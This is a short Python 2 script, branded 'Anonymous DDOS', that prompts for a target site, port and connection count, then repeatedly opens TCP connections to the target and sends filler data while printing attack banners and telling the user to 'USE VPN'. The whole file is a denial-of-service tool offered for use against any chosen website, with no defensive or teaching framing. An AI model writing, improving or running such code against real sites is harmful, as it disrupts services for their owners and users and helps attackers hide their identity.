import time, socket, os, sys, string
import subprocess

if os.name in ('nt', 'dos', 'ce'):
    os.system('title ................::::::: Anonymous DDOS :::::........')
    os.system('color 0a')
print \
"""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!ANONYMOUS DDOS ATTACK!
!!!!!!!!!USE VPN!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"""

host = raw_input('<~~~site: ')
port = input('<~~~port: ')
message = " + -----------------<>------------- + "
conn = input('<~~~number of connections: ')
ip = socket.gethostbyname(host)
print  ip 
print "[Ip is locked]"
print "[Attacking " + host + "]"
print message
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
    except socket.error:
        print ("|<~" + ip + " " + "failed to connect" + "~>|")
    print ("|<~~~~~~~DDoS~Attack~Engaged~~~~~~~~>|")
    ddos.close()
for i in range(1, conn):
    dos()
print message
print("Finished connections, bye!")
print message